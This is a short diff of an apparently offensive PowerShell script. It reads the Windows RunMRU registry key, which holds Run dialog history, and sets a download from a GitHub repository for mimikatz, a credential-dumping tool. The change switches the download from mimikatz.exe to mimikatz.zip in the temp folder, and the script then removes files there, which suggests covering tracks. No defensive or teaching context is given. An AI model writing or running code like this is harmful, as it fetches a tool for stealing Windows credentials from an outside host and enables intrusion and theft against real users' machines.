@@ -8,8 +8,8 @@ function Unzip
 
 $path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" 
 $arr = (Get-Item -Path $path).Property 
-$url = "https://github.com/ChandraOrbit/CHS/raw/master/mimikku/x64/mimikatz.exe"
-$output = "$env:temp/test.zip";
+$url = "https://github.com/ChandraOrbit/CHS/raw/master/mimikatz.zip"
+$output = "$env:temp/mimikatz.zip";
 $out = "$env:temp/Remake.txt";
 
 Remove-Item -Path $output
